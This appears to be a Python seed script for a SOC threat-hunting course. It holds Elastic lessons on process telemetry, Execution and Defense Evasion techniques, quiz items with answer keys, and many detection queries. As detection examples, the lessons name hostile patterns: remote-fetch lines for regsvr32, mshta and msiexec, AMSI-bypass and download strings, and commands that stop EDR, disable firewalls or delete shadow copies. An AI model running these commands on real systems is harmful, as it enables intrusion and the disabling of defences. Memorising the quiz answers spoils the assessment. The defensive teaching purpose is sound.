            "T1053 / T1569 execution patterns; T1027 / T1070 / T1562 / "
            "T1036 / T1112 evasion tradecraft; rare-process / rare-pair / "
            "command-line-entropy / signed-ratio / time-of-day statistical "
            "hunts in ES|QL; cross-source pivots between Elastic Agent and "
            "Sysmon; and a worked end-to-end PEAK hunt for *encoded "
            "PowerShell from Office parent* converted into a Kibana "
            "Security EQL detection rule body."
        ),
        estimated_minutes=240,
    )

    # Lesson 3.1 — Process-event data plane + ECS field reference
    m3l1 = _add_lesson(
        session, mod3, order=1,
        title="The process-event data plane in Elastic and the ECS field reference for hunters",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Distinguish the three principal sources of process-event telemetry on the Elastic stack — **Elastic Agent endpoint integration**, **Winlogbeat + Sysmon**, **native Windows Security log** — and pivot between them
> 2. Read the ECS field reference for process / file / library / registry hunts (`process.*`, `process.parent.*`, `process.code_signature.*`, `event.action`, `event.code`)
> 3. Use `process.entity_id` as the host-stable process unique-id for chain reconstruction
> 4. Recognise the schema differences between Elastic Agent and Winlogbeat that affect `union`-style multi-index hunts
> 5. Apply the broad-to-narrow hunt pattern from Module 1 to a process-event hunt across KQL → EQL → ES|QL
>
> **Prerequisites.** L2 Modules 1 (PEAK) and 2 (KQL/EQL/ES|QL fundamentals).

## The three data sources

A modern Elastic SOC has up to three process-event sources running in parallel. The L2 must know which is best populated for the hunt at hand and how to pivot between them.

### Elastic Agent endpoint integration — `logs-endpoint.events.process-*`

The default for new Elastic Stack deployments. Native ECS, schema-stable, fields clean. Sibling indices: `logs-endpoint.events.file-*`, `logs-endpoint.events.library-*`, `logs-endpoint.events.registry-*`, `logs-endpoint.events.network-*`. Each event has a fully-populated `process.command_line`, `process.parent.command_line`, `process.code_signature.subject_name`, `process.hash.sha256`, `process.entity_id`. **First reach for endpoint hunts.**

### Winlogbeat + Sysmon — `winlogbeat-*`

Older but still common deployment. Sysmon's structured XML-based logging, ingested by Winlogbeat into Elastic. Coverage:

| Sysmon EID | What it captures |
|---|---|
| **1** | Process create — full command line, parent, hashes |
| **2** | File create-time changed (timestomping) |
| **3** | Network connect |
| **7** | Image load (DLL / module) |
| **8** | CreateRemoteThread |
| **10** | ProcessAccess (LSASS dump signal) |
| **11** | File create |
| **13** | Registry value set |
| **22** | DNS query |
| **25** | Process tampering / image hollowing |

Mapped via `winlog.event_id` → `event.code`, `winlog.event_data.*` → various ECS paths. The L2 sees both the native Windows Security log events (4624, 4688, 7045, 4698, 1102) and Sysmon events on this same index pattern.

### Native Windows Security log

Surfaces inside `winlogbeat-*` if Sysmon isn't deployed, or alongside Sysmon if both are present. Key event codes:

| Event Code | Meaning |
|---|---|
| **4688** | Process create (truncated command line unless Audit Process Creation policy is enabled with the *Include Command Line* setting) |
| **4698** | Scheduled task created |
| **4700** / **4702** | Task enabled / updated |
| **4720** | User account created |
| **7045** | Service installed |
| **1102** | Security log cleared (T1070.001) |
| **104** | System log cleared |

**Practical gap.** EID 4688 silently lacks a usable command line unless the *Audit Process Creation* GPO with *Include command line in process creation events* is enabled. If the deployed estate hasn't enabled it, your only useful command-line surface is Sysmon EID 1 or Elastic Agent. The L2 reflex on a new estate: confirm command-line coverage before authoring command-line-pattern hunts.

## ECS field reference for process hunts

The fields the L2 will reach for daily:

| Category | Fields |
|---|---|
| Process identity | `process.name`, `process.executable`, `process.pid`, `process.entity_id`, `process.start` |
| Command line | `process.command_line`, `process.command_line.text` (analyzer-tokenised) |
| Parent | `process.parent.name`, `process.parent.executable`, `process.parent.command_line`, `process.parent.pid`, `process.parent.entity_id` |
| Hashes | `process.hash.sha256`, `process.hash.md5`, `process.hash.sha1` |
| Code signing | `process.code_signature.subject_name`, `.status`, `.trusted`, `.exists`, `.subject` |
| User | `process.user.name`, `process.user.domain`, `process.user.id` |
| Host | `host.name`, `host.os.family`, `host.os.platform`, `host.os.version` |
| Event meta | `event.action`, `event.category`, `event.type`, `event.outcome`, `event.code`, `event.kind` |
| File events | `file.path`, `file.name`, `file.extension`, `file.hash.sha256`, `file.created`, `file.mtime` |
| Registry | `registry.path`, `registry.value`, `registry.data.strings`, `registry.hive` |

**`process.entity_id` is the host-stable process unique id.** It survives across multiple events (process start → file write → process stop) for the same OS-level process, and is the join key the L2 uses to reconstruct a single process's full activity timeline.

## Schema differences between sources

| Field | Elastic Agent | Winlogbeat (Sysmon) | Native Security Log |
|---|---|---|---|
| Process name | `process.name` (clean) | `process.name` (mapped from `Image`) | `process.name` (mapped from `NewProcessName`) |
| Command line | `process.command_line` always populated | `process.command_line` populated for Sysmon EID 1 | `process.command_line` populated *only if* Audit Process Creation policy is enabled |
| Code signature | `process.code_signature.*` reliably populated (Elastic Agent) | Sysmon EID 7 populates for image-load events; EID 1 in newer Sysmon | Not present |
| Hash | `process.hash.sha256` always populated | Populated *if* Sysmon config has `<HashAlgorithms>SHA256</HashAlgorithms>` | Not present |
| Event code | `event.action: ("start", "process_started")` | `event.code: "1"` (Sysmon) or `"4688"` (native) | `event.code: "4688"` |

The L2's reflex when a hunt produces sparse results: check whether the *expected* fields are populated on the source you're querying. If `process.code_signature.trusted` is null on a Sysmon-only host, switch to `process.executable` path-based heuristics or pivot to Elastic Agent if available.

## Cross-source `union` pattern in ES|QL

When both sources are present in the estate, query both:

```esql
FROM logs-endpoint.events.process-*, winlogbeat-*
| WHERE @timestamp > NOW() - 7d
  AND (event.action IN ("start", "process_started") OR event.code == "1" OR event.code == "4688")
  AND process.name == "powershell.exe"
| STATS event_count = COUNT() BY host.name
```

The multi-index `FROM` is first-class in ES|QL. The `event.action`/`event.code` disjunction handles both schemas.

## Worked broad-to-narrow — KQL → EQL → ES|QL

A single hunt expressed in all three languages.

**Hunt:** *PowerShell with `-EncodedCommand` from an Office parent in the last 7 days.*

**KQL** in Discover (the analyst's first reach):

```kql
event.category: process
  and event.action: ("start" or "process_started")
  and process.name: ("powershell.exe" or "pwsh.exe")
  and process.command_line: (*-EncodedCommand* or *-enc *)
  and process.parent.name: ("WINWORD.EXE" or "EXCEL.EXE" or "POWERPNT.EXE" or "OUTLOOK.EXE")
```

**EQL** for the click-context (sequence-aware):

```eql
sequence by host.name with maxspan=5m
  [ process where process.name : ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE") ]
  [ process where process.name : ("powershell.exe", "pwsh.exe")
              and process.command_line : ("*-EncodedCommand*", "*-enc *", "*FromBase64String*") ]
```

**ES|QL** for triage aggregation:

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 7d
  AND KQL("process.name: (powershell.exe or pwsh.exe)
          AND process.command_line: (*EncodedCommand* or *FromBase64String* or *DownloadString*)
          AND process.parent.name: (WINWORD.EXE or EXCEL.EXE or POWERPNT.EXE or OUTLOOK.EXE)")
| STATS event_count = COUNT(),
        users = VALUES(user.name),
        parents = VALUES(process.parent.command_line)
  BY host.name, BUCKET(@timestamp, 1h)
| SORT event_count DESC
| LIMIT 100
```

Each language plays its part: KQL surfaces the artefact in Discover, EQL adds the behavioural-chain shape, ES|QL produces the triage-grade aggregation.

## Glossary

- **Elastic Agent endpoint integration** — `logs-endpoint.events.*` indices; native ECS; the modern default.
- **Winlogbeat + Sysmon** — older deployment; XML-based Sysmon logs ingested into `winlogbeat-*`.
- **`process.entity_id`** — host-stable unique process id; the join key for reconstructing a process's full activity timeline.
- **EID 4688 command-line gap** — native Windows process-create events lack command line unless the GPO is set; check before relying.

## Further reading

- Elastic docs — *Elastic Agent endpoint integration* schema reference.
- ECS field reference — `elastic.co/guide/en/ecs/current/ecs-field-reference.html`.
- SwiftOnSecurity Sysmon configuration — community standard for Sysmon coverage.
""",
    )
    m3l1q = _add_lesson(
        session, mod3, order=2, title="Data plane & ECS — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the three data sources, the EID 4688 command-line gap, `process.entity_id` use, and cross-source pivots.",
    )
    _add_q(session, m3l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunts for `process.command_line` patterns against `winlogbeat-*` events that map from native Windows Event ID 4688. The hunt returns mostly events with empty / `-` command lines despite knowing PowerShell with arguments ran. What's the most likely cause?",
        options=[
            {"value": "perm", "label": "Index permission issue"},
            {"value": "audit", "label": "The estate hasn't enabled the *Audit Process Creation* GPO with *Include command line in process creation events* — native EID 4688 silently lacks a usable command line without it. Switch to Sysmon EID 1 or Elastic Agent endpoint integration"},
            {"value": "retention", "label": "Data has aged out"},
            {"value": "wrong_field", "label": "The field is `process.cmd` not `process.command_line`"},
        ],
        correct="audit",
        explanation_md="EID 4688's command line requires the GPO sub-policy *Audit Process Creation: Include command line in process creation events*. Without it, native Windows process-create events lack a usable command line. Sysmon EID 1 and Elastic Agent endpoint events both populate `process.command_line` reliably and are the L2's preferred sources when this gap is present.",
        points=2,
    )
    _add_q(session, m3l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following statements about ECS process fields are *correct*?",
        options=[
            {"value": "entity_id", "label": "`process.entity_id` is host-stable for the lifetime of the OS-level process and is the canonical join key for reconstructing a process's full activity timeline"},
            {"value": "code_sig", "label": "`process.code_signature.subject_name`, `.status`, and `.trusted` are populated reliably by Elastic Agent endpoint integration"},
            {"value": "parent_cmd", "label": "`process.parent.command_line` is sometimes sparse on native EID 4688 (depending on policy) but reliably populated on Sysmon EID 1 and Elastic Agent"},
            {"value": "name_only", "label": "Process name (`process.name`) is the only field needed to fully identify a process — path and hash are redundant"},
            {"value": "kw_text", "label": "`process.command_line` is typically a `keyword` field with `process.command_line.text` as an analyzer-tokenised multi-field"},
        ],
        correct=["entity_id", "code_sig", "parent_cmd", "kw_text"],
        explanation_md="The trap is the fourth option. `process.name` is *not* sufficient — adversaries rename and masquerade (T1036). `process.executable` (full path), `process.hash.sha256`, and `process.code_signature.*` together identify the binary; `process.entity_id` identifies the *running instance*. The other four statements are correct.",
        points=3,
    )
    _add_q(session, m3l1q, order=3, kind=QuestionKind.SHORTANSWER,
        stem_md="Which ECS field is the *host-stable unique identifier* for a running OS-level process — used as the join key to reconstruct a single process's full activity timeline across multiple events (start → file write → network connect → stop)? (Field path.)",
        options=None,
        correct=["process.entity_id", "entity_id", "process.entity.id"],
        explanation_md="`process.entity_id` — host-stable for the process's lifetime. Survives across multiple event types (start / file create / network connect / stop) for the same OS-level process. The L2 uses it as the canonical join key for chain reconstruction in ES|QL `LOOKUP JOIN` and EQL `sequence` queries.",
        points=2,
    )
    _add_q(session, m3l1q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="When both Elastic Agent endpoint integration (`logs-endpoint.events.process-*`) and Winlogbeat+Sysmon (`winlogbeat-*`) are present in the estate, an L2 can query both in a single ES|QL pipeline using a multi-index `FROM logs-endpoint.events.process-*, winlogbeat-*` clause.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** ES|QL's `FROM` accepts multiple comma-separated index patterns natively. The L2 must align the `event.action` / `event.code` disjunction across schemas (e.g. `event.action IN (\"start\", \"process_started\") OR event.code == \"1\" OR event.code == \"4688\"`) but a single pipeline covers both sources.",
        points=2,
    )

    # Lesson 3.2 — Execution (TA0002)
    m3l2 = _add_lesson(
        session, mod3, order=3,
        title="Execution (TA0002) — top techniques and their EQL+ES|QL fingerprints",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Hunt **T1059 Command and Scripting Interpreter** sub-techniques using the suspicious-PowerShell vocabulary memo
> 2. Express **T1204 User Execution** click-paths as EQL `sequence` queries from Office / browser parents
> 3. Hunt the **T1218 LOLBAS** family in one query — `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, `msiexec.exe`, `cmstp.exe`, `hh.exe`
> 4. Detect **T1053.005 Scheduled Task** creation and **T1569.002 PsExec-class service execution** via EID 4698 / 7045 + process-tree pairs
> 5. Recognise when an alert needs an EQL behavioural-chain rule vs an ES|QL aggregation

## T1059 Command and Scripting Interpreter — the workhorse

Sub-techniques most relevant to L2 hunts on Windows:

- **.001 PowerShell** — `process.name in ("powershell.exe", "pwsh.exe")`.
- **.003 Windows Command Shell** — `process.name == "cmd.exe"`.
- **.005 Visual Basic** — `process.name in ("wscript.exe", "cscript.exe")` running `.vbs`.
- **.007 JavaScript** — `wscript`/`cscript` running `.js`; HTML-smuggled SVG-with-JS.

### The suspicious-PowerShell vocabulary memo

Memorise these substrings; the L2 should be able to write a single hunt that catches them all:

| Substring | What it indicates |
|---|---|
| `-EncodedCommand`, `-enc` | Base64-encoded payload |
| `-ExecutionPolicy Bypass`, `-ep bypass` | Policy bypass |
| `-NoProfile`, `-nop` | Skip user profile (avoids forensic artefacts) |
| `-WindowStyle Hidden`, `-w hidden` | UI suppression |
| `IEX`, `Invoke-Expression` | In-line code execution |
| `DownloadString`, `DownloadFile`, `Net.WebClient` | Remote code fetch |
| `FromBase64String` | Base64 decode |
| `Invoke-Mimikatz`, `Invoke-PSExec`, `Invoke-WMIExec` | Offensive-tool fingerprints |
| `[Reflection.Assembly]::Load` | Reflective .NET load |
| `AmsiUtils`, `amsiInitFailed` | AMSI bypass attempt |

KQL hunt for the cluster:

```kql
event.category: process and event.action: ("start" or "process_started")
  and process.name: ("powershell.exe" or "pwsh.exe")
  and process.command_line: (*-EncodedCommand* or *-enc * or *FromBase64String*
                             or *DownloadString* or *Invoke-Expression* or *IEX *
                             or *AmsiUtils* or *amsiInitFailed*
                             or *[Reflection.Assembly]::Load*)
```

EQL form (case-insensitive `:`):

```eql
process where event.action : ("start", "process_started")
  and process.name : ("powershell.exe", "pwsh.exe")
  and process.command_line : ("*-EncodedCommand*", "*-enc *", "*FromBase64String*",
                              "*DownloadString*", "*Invoke-Expression*", "*IEX *",
                              "*AmsiUtils*", "*[Reflection.Assembly]::Load*")
```

ES|QL with embedded KQL filter — for fleet-wide aggregation:

```esql
FROM logs-endpoint.events.process-*, winlogbeat-*
| WHERE @timestamp > NOW() - 7d
  AND KQL("process.name: (powershell.exe or pwsh.exe)
          AND process.command_line: (*EncodedCommand* or *FromBase64String* or *DownloadString* or *Invoke-Expression* or *AmsiUtils*)")
| STATS event_count = COUNT(),
        commands = VALUES(process.command_line),
        parents = VALUES(process.parent.name)
  BY host.name, user.name
| SORT event_count DESC
| LIMIT 200
```

### PowerShell script-block logging — the second source

PowerShell EID 4103 (module logging) and 4104 (script-block logging) surface in Elastic via `winlog.channel: "Microsoft-Windows-PowerShell/Operational"`. Script-block logging captures the *deobfuscated* script content, which can catch encoded commands that the process-create event sees only in base64.

```kql
winlog.channel: "Microsoft-Windows-PowerShell/Operational"
  and event.code: "4104"
  and powershell.file.script_block_text: (*Invoke-Mimikatz* or *FromBase64String* or *AmsiUtils*)
```

## T1204 User Execution — click-path chains

The Module-6 (L1) phishing click-path joins ATT&CK here. Two canonical chains:

- **Office macro / link** → `WINWORD.EXE`/`EXCEL.EXE`/`OUTLOOK.EXE` → script host
- **Browser drive-by** → `msedge.exe`/`chrome.exe`/`firefox.exe` → script host

EQL `sequence` for the browser click-path joined with a network event:

```eql
sequence by host.name with maxspan=10m
  [ network where event.action == "url_click_allowed"
              and url.domain : ("*.azurewebsites.net", "*.workers.dev", "*.r2.dev") ]
  [ process where process.parent.name : ("msedge.exe", "chrome.exe", "firefox.exe")
              and process.name : ("powershell.exe", "cmd.exe", "mshta.exe", "rundll32.exe") ]
```

EQL `sequence` for the Office click-path:

```eql
sequence by host.name with maxspan=5m
  [ process where process.name : ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE") ]
  [ process where process.parent.name : ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE")
              and process.name : ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe") ]
```

The first step *anchors* the chain to an Office process invocation; the second step finds the script-host child within 5 minutes.

## T1218 LOLBAS — the catalogue and a single covering hunt

The LOLBAS catalogue (`lolbas-project.github.io`) maintains every signed Microsoft Windows binary with abuse potential, mapped to ATT&CK technique IDs. Common sub-techniques:

| Sub-tech | Binary | Abuse pattern |
|---|---|---|
| .001 | `hh.exe` | Compiled HTML File launcher |
| .003 | `cmstp.exe` | Connection Manager profile installer; INF SCT scriptlets |
| .005 | `mshta.exe` | `mshta.exe http://.../payload.hta` |
| .007 | `msiexec.exe` | `msiexec /i http://.../x.msi /quiet` |
| .010 | `regsvr32.exe` | Squiblydoo: `regsvr32 /s /u /n /i:http://.../x.sct scrobj.dll` |
| .011 | `rundll32.exe` | `rundll32 javascript:...`; `rundll32 url.dll,...` |

Single covering EQL hunt for any LOLBAS launcher invoking remote code:

```eql
process where process.name : ("mshta.exe", "regsvr32.exe", "rundll32.exe",
                              "msiexec.exe", "cmstp.exe", "hh.exe",
                              "installutil.exe", "regasm.exe", "regsvcs.exe",
                              "wmic.exe", "csc.exe")
  and process.command_line : ("*http://*", "*https://*", "*\\\\\\\\*\\\\*",
                              "*javascript:*", "*vbscript:*",
                              "*scrobj.dll*", "*xsl*", "*.sct*")
```

The L2's reflex when this hunt produces a result: cross-reference the binary in LOLBAS to confirm the documented abuse pattern matches. Refresh against the catalogue quarterly — new entries land regularly.

## T1053.005 Scheduled Task

Three telemetry surfaces:

- **Native EID 4698** (task created), **4702** (updated), **4700** (enabled). `winlog.event_data.TaskName` and `winlog.event_data.TaskContent` (XML) carry the task definition.
- **Sysmon process create** with parent `svchost.exe -k netsvcs` (the host of the Schedule service).
- **Process-create form** of the user-driven creation: `process.name == "schtasks.exe"` with `/create /tn ... /tr ... /sc minute /mo 1 /ru SYSTEM`.

EQL hunt covering the user-driven form:

```eql
process where process.name : "schtasks.exe"
  and process.command_line : "*/create*"
  and (process.command_line : "*/sc minute*"
       or process.command_line : "*/sc hourly*"
       or process.command_line : "*/ru system*"
       or process.command_line : "*\\\\\\\\*"
       or process.command_line : "*http*")
```

KQL hunt for the native EID 4698:

```kql
event.code: "4698"
  and (winlog.event_data.TaskContent: *http* or winlog.event_data.TaskContent: *powershell*
       or winlog.event_data.TaskContent: *cmd.exe* or winlog.event_data.TaskContent: *base64*)
```

## T1569.002 System Services — PsExec class

SCM creates a service whose binary path is the payload, runs as `LOCAL SYSTEM`, then deletes the service. **EID 7045** (service installed) is the canonical signal.

Service-name patterns:

- Random 16-char strings (Impacket `psexec.py` default; many Cobalt Strike service-named beacons).
- Literal `PSEXESVC` (Sysinternals PsExec).
- Vendor-bait names (`Defender`, `WindowsUpdate`) when the operator masquerades.

EQL `sequence` for the SCM-spawned payload:

```eql
sequence by host.name with maxspan=2m
  [ iam where event.code == "7045" ]
  [ process where process.parent.name : "services.exe"
              and process.executable : ("?:\\\\Windows\\\\TEMP\\\\*",
                                         "?:\\\\Users\\\\Public\\\\*",
                                         "?:\\\\PerfLogs\\\\*",
                                         "?:\\\\ProgramData\\\\*") ]
```

The first step is the service-install event; the second step is the SCM-spawned payload from a user-writable path. The 2-minute window keeps the FP rate low because legitimate services usually install from `Program Files`.

## When to author a sequence rule vs an aggregation

**EQL `sequence` rule** when the hunt is fundamentally a *behavioural chain*:
- Office → script host (T1204 → T1059)
- Service install → SCM payload spawn (T1569.002)
- LSASS access → DCSync (T1003.001 → T1003.006, covered in M5)

**ES|QL aggregation rule / dashboard** when the hunt is fundamentally a *threshold or pivot*:
- ≥ N suspicious-PowerShell hits per host per hour
- Rare LOLBAS binary per fleet
- Encoded-command count by user

EQL rule bodies become Kibana Security EQL detection rules with no rewriting; ES|QL aggregations typically become dashboards or threshold rules.

## Glossary

- **LOLBAS** — *Living Off The Land Binaries, Scripts and Libraries* (`lolbas-project.github.io`). Catalogue of signed Windows binaries with abuse potential.
- **PowerShell EID 4104** — script-block logging; deobfuscated script content surfaces here.
- **EID 4698 / 7045** — scheduled task created / service installed.
- **Squiblydoo** — `regsvr32 /s /u /n /i:http://.../x.sct scrobj.dll` — a T1218.010 sub-technique pattern.
- **PSEXESVC** — Sysinternals PsExec's service-name fingerprint.

## Further reading

- LOLBAS — `lolbas-project.github.io`.
- Elastic Security prebuilt-rule library — EQL rules for T1059 / T1218 / T1053 / T1569.
- ATT&CK technique pages — `attack.mitre.org/techniques/T1059/`, `T1218/`, etc.
""",
    )
    m3l2q = _add_lesson(
        session, mod3, order=4, title="Execution — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the suspicious-PowerShell vocabulary, T1218 LOLBAS coverage, T1569.002 PsExec fingerprints, and EQL sequence vs ES|QL aggregation rule selection.",
    )
    _add_q(session, m3l2q, order=1, kind=QuestionKind.MULTI,
        stem_md="Which of the following PowerShell command-line substrings should an L2's hunt for *suspicious PowerShell* (T1059.001) explicitly catch?",
        options=[
            {"value": "enc", "label": "`-EncodedCommand` / `-enc`"},
            {"value": "iex_ds", "label": "`IEX` and `DownloadString`"},
            {"value": "amsi", "label": "`AmsiUtils` / `amsiInitFailed` (AMSI bypass)"},
            {"value": "frombase", "label": "`FromBase64String`"},
            {"value": "azc", "label": "`Get-AzContext` (Azure auth-context check)"},
        ],
        correct=["enc", "iex_ds", "amsi", "frombase"],
        explanation_md="Encoded commands, IEX+DownloadString chains, AMSI-bypass strings, and FromBase64String are reliably suspicious. `Get-AzContext` is benign developer / DevOps activity that the L2 should *not* alert on. Knowing which patterns are FP-class is the L2's everyday discipline — exclusion lists matter as much as inclusion lists.",
        points=3,
    )
    _add_q(session, m3l2q, order=2, kind=QuestionKind.SINGLE,
        stem_md="A LOLBAS hunt should cover any signed Microsoft binary that fetches remote code. Which set best represents the *core* T1218 LOLBAS launchers an L2 should include in a single covering query?",
        options=[
            {"value": "narrow", "label": "Only `mshta.exe` and `regsvr32.exe`"},
            {"value": "core", "label": "`mshta.exe`, `regsvr32.exe`, `rundll32.exe`, `msiexec.exe`, `cmstp.exe`, `hh.exe`, `installutil.exe`, `regasm.exe`, `wmic.exe`"},
            {"value": "broad", "label": "Every binary in `C:\\\\Windows\\\\System32`"},
            {"value": "office", "label": "Office binaries (`WINWORD.EXE`, `EXCEL.EXE`)"},
        ],
        correct="core",
        explanation_md="The LOLBAS catalogue (`lolbas-project.github.io`) maintains the canonical list. The core set covers the .001/.003/.005/.007/.010/.011 sub-techniques plus `wmic`, `installutil`, `regasm` for breadth. Narrower lists miss real abuse; broader lists (every System32 binary) generate noise. Refresh quarterly as LOLBAS adds entries.",
        points=2,
    )
    _add_q(session, m3l2q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunts for **T1569.002 PsExec-class service execution** and wants high specificity with low FP. Which combination of telemetry, joined as an EQL `sequence by host.name with maxspan=2m`, gives the strongest signal?",
        options=[
            {"value": "name_only", "label": "Service name == `PSEXESVC` only"},
            {"value": "eid7045_path", "label": "EID 7045 (service installed) followed by a process whose parent is `services.exe` and whose executable is in a user-writable path (`%TEMP%`, `Users\\Public`, `PerfLogs`, `ProgramData`)"},
            {"value": "any_service", "label": "Any EID 7045 event"},
            {"value": "anything_temp", "label": "Anything running from `%TEMP%`"},
        ],
        correct="eid7045_path",
        explanation_md="Pairing EID 7045 with the SCM-spawned payload (parent `services.exe` from a user-writable path) is the textbook PsExec fingerprint with low FP. Service-name-only filters miss bespoke randomised names. Any-EID-7045 alone produces FP from legitimate vendor installs. Anything-from-TEMP catches non-service activity. The behavioural pair gives both halves of the signal in one rule.",
        points=2,
    )
    _add_q(session, m3l2q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="When a hunt is fundamentally a *behavioural chain* (e.g. Office process → script-host child within 5 minutes), the L2 should author it as an **EQL `sequence` rule** for Kibana Security; when a hunt is fundamentally a *threshold or pivot* (e.g. ≥ 10 suspicious-PowerShell hits per host per hour), an **ES|QL aggregation** is the better fit.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** EQL `sequence` is the only Elastic query language with first-class behavioural-chain semantics — the rule body translates 1:1 to a Kibana Security EQL detection rule. ES|QL is unmatched for thresholds, aggregations, and pivots, and runs as a Kibana Security ES|QL rule from 8.13 onward. Choose by question shape, not by language preference.",
        points=2,
    )

    # Lesson 3.3 — Defense Evasion (TA0005)
    m3l3 = _add_lesson(
        session, mod3, order=5,
        title="Defense Evasion (TA0005) — top techniques and their fingerprints",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Hunt **T1027 Obfuscated Files or Information** — command-obfuscation patterns and packing
> 2. Detect **T1070 Indicator Removal** — log clearing, command-history clearing, file deletion, timestomping
> 3. Catch **T1562 Impair Defenses** — EDR/AV tampering, log-disable, firewall-disable, safe-mode boot
> 4. Surface **T1036 Masquerading** — invalid signatures and `svchost`/`lsass` running outside System32
> 5. Hunt **T1112 Modify Registry** — LSA Protection, AMSI providers, WDigest credential caching

## T1027 Obfuscated Files or Information

Three sub-techniques relevant to L2 process-event hunts:

- **.002 Software Packing** — UPX, custom packers. Caught at hash / static-analysis layer; visible in `process.code_signature.status: "untrusted"` paired with high entropy.
- **.006 HTML Smuggling** — Module 6 (L1) phishing.
- **.010 Command Obfuscation** — Invoke-Obfuscation patterns: `^` carets in cmd, `${var}` PowerShell tricks, concatenated strings, backtick-escapes, character substitution (`p^o^w^e^r^s^h^e^l^l`).

ES|QL hunt for command-obfuscation special-character density (proxy for entropy):

```esql
FROM logs-endpoint.events.process-*, winlogbeat-*
| WHERE @timestamp > NOW() - 7d
  AND process.name IN ("powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe")
| EVAL cmd_len = LENGTH(process.command_line)
| EVAL specials = LENGTH(process.command_line) -
                  LENGTH(REPLACE(REPLACE(REPLACE(process.command_line, "^", ""), "`", ""), "$", ""))
| EVAL density = TO_DOUBLE(specials) / TO_DOUBLE(cmd_len)
| WHERE cmd_len > 300 AND density > 0.05
| KEEP @timestamp, host.name, user.name, process.name, process.command_line, cmd_len, specials, density
| SORT density DESC
| LIMIT 200
```

A hand-tuned threshold — `cmd_len > 300 AND density > 0.05` — catches Invoke-Obfuscation-style outputs without much noise. Re-baseline per fleet.

## T1070 Indicator Removal

### .001 Clear Windows Event Logs

Native: **EID 1102** (Security log cleared) and **EID 104** (System log cleared). Process-side: `process.name == "wevtutil.exe"` with `cl` or `clear-log`.

```kql
event.code: ("1102" or "104")
  or (process.name: "wevtutil.exe" and process.command_line: (*cl Security* or *cl System* or *clear-log*))
```

EID 1102 in particular is rare in normal operations and a *page-IR* alert when it fires unattributed.

### .003 Clear Command History

`Clear-History` in PowerShell; `del %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`.

```eql
file where event.action == "deletion"
  and file.path : "*\\\\PSReadLine\\\\ConsoleHost_history.txt"
```

### .004 File Deletion

Payload self-deletes on completion. Catch with `logs-endpoint.events.file-*` `event.action: "deletion"` cross-joined with the recently-executed binary's path:

```eql
sequence by host.name with maxspan=5m
  [ process where event.action : ("start", "process_started")
              and not process.code_signature.trusted == true ]
  [ file where event.action == "deletion" and file.path : "?:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Temp\\\\*" ]
```

### .006 Timestomp

Modifying file MAC times. Sysmon Event 2 (`FileCreateTime`) catches this directly; ECS exposes `file.mtime` (last modified) and `file.created`. The classical fingerprint: `file.mtime` *earlier* than `file.created`.

```esql
FROM logs-endpoint.events.file-*
| WHERE @timestamp > NOW() - 7d
  AND file.mtime < file.created
| KEEP @timestamp, host.name, file.path, file.mtime, file.created
| LIMIT 200
```

## T1562 Impair Defenses

Comprehensive coverage in a single EQL hunt:

```eql
process where (
  // .001 — sc stop / kill EDR
  (process.name : "sc.exe" and process.command_line : ("*stop Sense*", "*stop WinDefend*", "*stop MsMpSvc*", "*stop CSFalconService*"))
  or (process.name : ("powershell.exe", "pwsh.exe")
      and process.command_line : ("*Set-MpPreference*-DisableRealtimeMonitoring*",
                                   "*Set-MpPreference*-DisableIOAVProtection*",
                                   "*Set-MpPreference*-DisableScriptScanning*",
                                   "*Add-MpPreference*-ExclusionPath*"))
  or (process.name : "taskkill.exe" and process.command_line : ("*MsMpEng.exe*", "*SenseIR*", "*CSFalconService*", "*MsSense*"))
  // .002 — disable Event Log
  or (process.name : "auditpol.exe" and process.command_line : "*disable*")
  or (process.name : "sc.exe" and process.command_line : "*config eventlog*disabled*")
  // .004 — disable firewall
  or (process.name : "netsh.exe" and process.command_line : "*advfirewall*off*")
  // .009 — Safe Mode boot
  or (process.name : "bcdedit.exe" and process.command_line : "*safeboot*")
)
```

Each sub-clause maps to a sub-technique. The ransomware-affiliate pre-encryption sequence often runs three or four of these in quick succession — a `sample by host.name` (M2 Lesson 3) catches the cluster:

```eql
sample by host.name
  [ process where process.name : "sc.exe" and process.command_line : "*stop*Sense*" ]
  [ process where process.name : ("powershell.exe", "pwsh.exe")
              and process.command_line : "*Set-MpPreference*-DisableRealtimeMonitoring*" ]
  [ process where process.name : "vssadmin.exe" and process.command_line : "*delete shadows*" ]
```

This finds hosts where all three pre-ransomware actions occurred in any order — a high-priority *page-IR* signal.

## T1036 Masquerading

### .005 Match Legitimate Name or Location

`svchost.exe`, `lsass.exe`, `csrss.exe`, `winlogon.exe`, `services.exe` running from anywhere *other* than the Windows system directory:

```kql
event.category: process
  and process.name: ("svchost.exe" or "lsass.exe" or "csrss.exe" or "winlogon.exe"
                     or "services.exe" or "smss.exe" or "explorer.exe")
  and not process.executable: ("C:\\Windows\\System32\\*"
                                or "C:\\Windows\\SysWOW64\\*"
                                or "C:\\Windows\\explorer.exe")
```

